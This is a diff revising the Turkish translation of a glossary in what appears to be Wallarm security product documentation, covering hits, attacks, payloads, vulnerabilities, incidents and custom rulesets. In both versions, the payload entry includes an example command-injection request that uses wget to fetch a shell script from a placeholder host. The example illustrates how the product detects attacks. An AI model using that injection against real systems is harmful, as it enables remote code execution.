@@ -1,44 +1,35 @@
-# Sözlük
+# Terimler Sözlüğü
 
-Sözlük, platformu daha iyi anlamanız için çekirdek Wallarm öğelerini kapsar.
+Sözlük, platformu daha iyi anlamanız için temel Wallarm varlıklarını kapsamaktadır.
 
 ## Hit
 
-Hit, serileştirilmiş kötü niyetli bir istektir (filtreleme düğümü tarafından eklenen orijinal kötü niyetli istek ve metadata), örneğin:
+Hit, seri hale getirilmiş kötü amaçlı bir istek (orijinal kötü amaçlı istek ve filtreleme düğümü tarafından eklenen meta veriler) anlamına gelir, örneğin:
 
 ![Hit örneği](images/user-guides/events/analyze-attack-raw.png)
 
-[Hit parametreleri hakkında ayrıntılar](user-guides/events/analyze-attack.md#analyze-requests-in-an-event)
+[Hit parametreleri hakkında detaylar](user-guides/events/check-attack.md#attack-analysis_1)
 
 ## Saldırı
 
-Bir saldırı, aşağıdaki özelliklere göre gruplandırılan tek bir hit veya birden fazla hittir:
+Saldırı, tek bir hit veya birden fazla hit'in [gruplandırılmış](user-guides/events/grouping-sampling.md#grouping-of-hits) halidir.
 
-* Aynı saldırı türü, kötü niyetli yük taşıyan parametre ve hit'lerin gönderildiği adres. Hit'ler aynı veya farklı IP adreslerinden gelebilir ve bir saldırı türü içinde kötü niyetli yüklerin farklı değerlerine sahip olabilir.
+Tek bir hit içeren bir saldırı örneği:
 
-    Bu hit gruplama yöntemi temeldir ve tüm hit'lere uygulanır.
-* Uygun [tetikleyici](user-guides/triggers/trigger-examples.md#group-hits-originating-from-the-same-ip-into-one-attack) etkinleştirildiyse aynı kaynak IP adresi. Diğer hit parametre değerleri farklı olabilir.
+![Bir hit ile saldırı](images/glossary/attack-with-one-hit-example.png)
 
-    Bu hit gruplama yöntemi, Brute force, Forced browsing, BOLA (IDOR), Resource overlimit, Data bomb ve Virtual patch saldırı türlerindeki hit'ler dışında tüm hit'ler için çalışır.
+Birden fazla hit içeren bir saldırı örneği:
 
-    Hit'ler bu yöntemle gruplandırıldığında, saldırı için [**Yanlış pozitif olarak işaretle**](user-guides/events/false-attack.md#mark-an-attack-as-a-false-positive) düğmesi ve [aktif doğrulama](about-wallarm/detecting-vulnerabilities.md#active-threat-verification) seçeneği kullanılamaz.
+![Birçok hit ile saldırı](images/glossary/attack-with-several-hits-example.png)
 
-Belirtilen hit gruplama yöntemleri birbirini dışlamaz. Hit'lerin her iki yöntemin özelliklerine sahip olması durumunda, hepsi tek bir saldırıya gruplandırılır.
+Saldırıları anlama ve analiz etme hakkında [detaylara](user-guides/events/check-attack.md) bakınız.
 
-Tek bir hit içeren bir saldırının örneği:
+## Kötü Amaçlı Yük
 
-![Tek hit'li saldırı](images/glossary/attack-with-one-hit-example.png)
+Orijinal bir isteğin, aşağıdaki öğeleri içeren kısmıdır:
 
-Birçok hit içeren bir saldırının örneği:
-
-![Birçok hit'li saldırı](images/glossary/attack-with-several-hits-example.png)
-
-## Kötü Niyetli Yük
-
-Aşağıdaki öğeleri içeren orijinal bir istemin bir parçası:
-
-* Bir istekte tespit edilen saldırı işaretleri. Bir istekte aynı saldırı türünü karakterize eden birkaç saldırı işareti tespit edilirse, sadece ilk işaret yüke kaydedilir.
-* Saldırı işaretinin bağlamı. Bağlam, tespit edilen saldırı işaretlerinin önünde ve sonunda bulunan bir sembol setidir. Bir yük uzunluğu sınırlı olduğundan, bir saldırı işareti tam yük uzunluğunda ise bağlam atlanabilir.
+* Bir istekte tespit edilen saldırı işaretleri. Bir istekte aynı saldırı türünü karakterize eden birden fazla saldırı işareti tespit edilirse, yalnızca ilk işaret yük olarak kaydedilir.
+* Saldırı işareti bağlamı. Bağlam, tespit edilen saldırı işaretlerinden önce gelen ve sonrasında gelen sembollerin kümesidir. Yük uzunluğu sınırlı olduğundan, bir saldırı işareti tüm yük uzunluğunda ise bağlam atlanabilir.
 
 Örneğin:
 
@@ -47,59 +38,64 @@ Aşağıdaki öğeleri içeren orijinal bir istemin bir parçası:
     ```bash
     curl localhost/?23036d6ba7=%3Bwget+http%3A%2F%2Fsome_host%2Fsh311.sh
     ```
-* Kötü niyetli yük:
+* Kötü amaçlı yük:
 
     ```bash
     ;wget+http://s
     ```
 
-    Bu yükte, `;wget+` [RCE](attacks-vulns-list.md#remote-code-execution-rce) saldırı işareti ve yükün diğer parçası saldırı işaretinin bağlamıdır.
+    Bu yükte, `;wget+` [RCE](attacks-vulns-list.md#remote-code-execution-rce) saldırı işaretidir ve yükün diğer kısmı saldırı işareti bağlamını oluşturmaktadır.
 
-Saldırı işaretleri [davranışsal saldırıları](about-wallarm/protecting-against-attacks.md#behavioral-attacks) tespit etmek için kullanılmadığından, davranışsal saldırıların bir parçası olarak gönderilen isteklerin boş yükleri vardır.
+Saldırı işaretleri, [davranışsal saldırıları](about-wallarm/protecting-against-attacks.md#behavioral-attacks) tespit etmekte kullanılmadığından, davranışsal saldırılar kapsamında gönderilen isteklerin yükleri boştur.
 
-## Güvenlik Zaafı
-Bir güvenlik zaafı, bir web uygulamasını oluştururken veya uygularken ihmalkarlık veya yetersiz bilgi nedeniyle yapılan bir hata olup bilgi güvenliği riskine yol açabilir.
+## Güvenlik Açığı
 
-Bilgi güvenliği riskleri:
+Güvenlik açığı, bir web uygulaması oluşturulurken veya uygulanırken ihmal veya yetersiz bilgi nedeniyle yapılan bir hatadır ve bilgi güvenliği risklerine yol açabilir.
+
+Bilgi güvenliği riskleri şunlardır:
 
 * Yetkisiz veri erişimi; örneğin, kullanıcı verilerini okuma ve değiştirme erişimi.
-* Hizmeti reddetme.
+* Hizmet reddi.
 * Veri bozulması ve diğerleri.
 
-Internet trafiği, Wallarm'ın diğer fonksiyonlarının yanı sıra güvenlik zaafiyetlerini tespit etmek için kullanılabilir.
+İnternet trafiği, güvenlik açıklarını tespit etmek için kullanılabilir; Wallarm'ın diğer işlevleri arasında bu da yer almaktadır.
 
 ## Güvenlik Olayı
 
-Bir güvenlik olayı, bir güvenlik zaafiyetinin sömürülmesi olayıdır. Bir olay, doğrulanmış bir güvenlik zaafiyetine yönelik bir [saldırı](#attack)'dır.
+Güvenlik olayı, bir güvenlik açığının sömürülmesidir. Bir olay, doğrulanmış bir güvenlik açığına yönelik bir [saldırı](#attack)'dır.
 
-Bir olay, tıpkı bir saldırı gibi, sisteminizin dışında bir varlık ve dış İnternet'in, sistemin kendisinin değil, bir özelliğidir. Var olan güvenlik zaafiyetlerine yönelik saldırılar azınlık olsa da, bilgi güvenliği açısından son derece önemlidirler. Wallarm var olan güvenlik zaafiyetlerine yönelik saldırıları otomatik olarak tespit eder ve bunları ayrı bir obje - olay - olarak görüntüler.
+Bir olay, tıpkı bir saldırı gibi, sisteminiz dışındaki bir varlıktır ve dış İnternet'in bir özelliğini yansıtır, sistemin kendisini değil. Mevcut güvenlik açıklarına yönelik saldırılar azınlıkta olsa da, bilgi güvenliği açısından son derece önemlidir. Wallarm, mevcut güvenlik açıklarına yönelik saldırıları otomatik olarak tespit eder ve bunları ayrı bir nesne olarak görüntüler – olay.
 
-## Dairesel Tampon
-Dairesel tampon, uçtan uca bağlıymış gibi sabit boyutlu tek bir tampon kullanarak veri yapısıdır. 
-[Wikipedia'ya bakın](https://en.wikipedia.org/wiki/Circular_buffer).
+## Dairesel Kuyruk
 
-## Özel kural seti (eski terim LOM)
+Dairesel kuyruk, sanki birbirine bağlıymış gibi tek, sabit boyutlu bir arabellek kullanan bir veri yapısıdır.
+[See Wikipedia](https://en.wikipedia.org/wiki/Circular_buffer).
 
-Bir özel kural seti, Wallarm düğümlerinin Wallarm Bulutu'ndan indirdiği derlenmiş güvenlik kurallarının bir setidir.
+## Özel Kurallar Seti (önceki terim LOM)
 
-Özel kurallar, trafik işleme için bireysel kurallar ayarlamanıza olanak sağlar, örneğin:
+Özel kurallar seti, Wallarm Cloud'dan Wallarm düğümleri tarafından indirilen derlenmiş güvenlik kuralları bütünüdür.
 
-* Hassas verileri Wallarm Bulutu'na yüklemeden önce maskele
-* RegExp tabanlı saldırı göstergeleri oluştur
-* Aktif bir güvenlik zaafiyetini sömüren istekleri engelleyen bir sanal yamayı uygula
-* Belirli isteklerde saldırı tespitini devre dışı bırak, vb.
+Özel kurallar, trafik işleme için bireysel kurallar oluşturmanızı sağlar, örneğin:
 
-Bir özel kural seti varsayılan olarak boş değildir, Bulut'ta kayıtlı tüm müşteriler için oluşturulan kuralları içerir, örneğin [**Ayarlar → Genel** sekmesinde](user-guides/settings/general.md) değeri olan filtreleme modu kuralı.
+* Wallarm Cloud'a yüklemeden önce hassas verileri maskeleme
+* Düzenli ifadeye dayalı saldırı göstergeleri oluşturma
+* Aktif bir güvenlik açığından yararlanan istekleri engelleyen sanal yama uygulama
+* Belirli isteklerde saldırı tespitini devre dışı bırakma vb.
 
-[Özel kural setleri hakkında daha fazla ayrıntı](user-guides/rules/rules.md)
+Özel kurallar seti varsayılan olarak boş değildir; Cloud'da kayıtlı tüm müşteriler için oluşturulan kuralları içerir, örneğin [**Ayarlar → Genel** sekmesindeki](admin-en/configure-wallarm-mode.md#general-filtration-rule-in-wallarm-console) filtreleme modu kuralı.
+
+[Özel kurallar seti hakkında daha fazla detay](user-guides/rules/rules.md)
 
 ## Geçersiz İstek
-Filtre düğümü tarafından kontrol edilen ve LOM kurallarına uymayan bir istek.
 
-## Ters Proxy
-Bir ters proxy, kaynakları bir sunucudan bir istemci adına alıp istemciye kaynakları, sanki kaynaklar Web sunucusundan geliyormuş gibi geri döndüren bir proxy sunucusu tipidir.
-[Wikipedia'ya bakın](https://en.wikipedia.org/wiki/Reverse_proxy).
+Filtreleme düğümü tarafından kontrol edilen ve LOM kurallarıyla eşleşmeyen istek.
 
-## Sertifika Yetkilisi
-Bir sertifika yetkilisi, dijital sertifikalar veren bir varlıktır.
-[Wikipedia'ya bakın](https://en.wikipedia.org/wiki/Certificate_authority).
+## Reverse Proxy
+
+Reverse Proxy, bir istemci adına bir sunucudan kaynakları alıp, bu kaynakları Web sunucusundan geliyormuş gibi istemciye dönen bir proxy sunucusu türüdür.
+[See Wikipedia](https://en.wikipedia.org/wiki/Reverse_proxy).
+
+## Certificate Authority
+
+Certificate Authority, dijital sertifikalar düzenleyen bir varlıktır.
+[See Wikipedia](https://en.wikipedia.org/wiki/Certificate_authority).
